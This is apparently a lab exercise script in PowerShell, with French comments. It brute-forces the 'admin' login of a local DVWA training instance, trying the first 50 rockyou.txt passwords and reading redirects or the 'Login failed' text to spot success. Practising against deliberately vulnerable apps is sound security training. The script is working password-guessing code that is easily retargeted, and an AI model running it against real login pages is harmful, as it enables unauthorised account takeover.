# scripts\bruteforce.ps1
Write-Host "=== BRUTE FORCE DVWA ===" -ForegroundColor Green

# Vérifier que le fichier rockyou.txt existe
$wordlist = "rockyou.txt"
if (-not (Test-Path $wordlist)) {
    Write-Host "Fichier $wordlist non trouvé!" -ForegroundColor Red
    exit
}

# Lire les 50 premiers mots de passe seulement (pour test)
$passwords = Get-Content $wordlist | Select-Object -First 50
$total = $passwords.Count
$count = 0

Write-Host "Test de $total mots de passe..." -ForegroundColor Yellow

foreach ($pass in $passwords) {
    $count++
    Write-Host "[$count/$total] Test: admin / $pass" -ForegroundColor Cyan
    
    try {
        $response = Invoke-WebRequest -Uri "http://localhost:8080/login.php" `
            -Method POST `
            -Body "username=admin&password=$pass&Login=Login" `
            -UseBasicParsing `
            -MaximumRedirection 0 `
            -ErrorAction Stop
        
        # Si pas de redirection, le login a échoué
        if ($response.StatusCode -eq 200) {
            if ($response.Content -notmatch "Login failed") {
                Write-Host ">>> SUCCES! Mot de passe trouvé: $pass <<<" -ForegroundColor Green
                break
            }
        }
    }
    catch {
        # Redirection 302 = login réussi
        if ($_.Exception.Response.StatusCode.value__ -eq 302) {
            Write-Host ">>> SUCCES! Mot de passe trouvé: $pass <<<" -ForegroundColor Green
            break
        }
    }
    
    # Pause pour ne pas surcharger le serveur
    Start-Sleep -Milliseconds 100
}

Write-Host "Brute force terminé" -ForegroundColor Green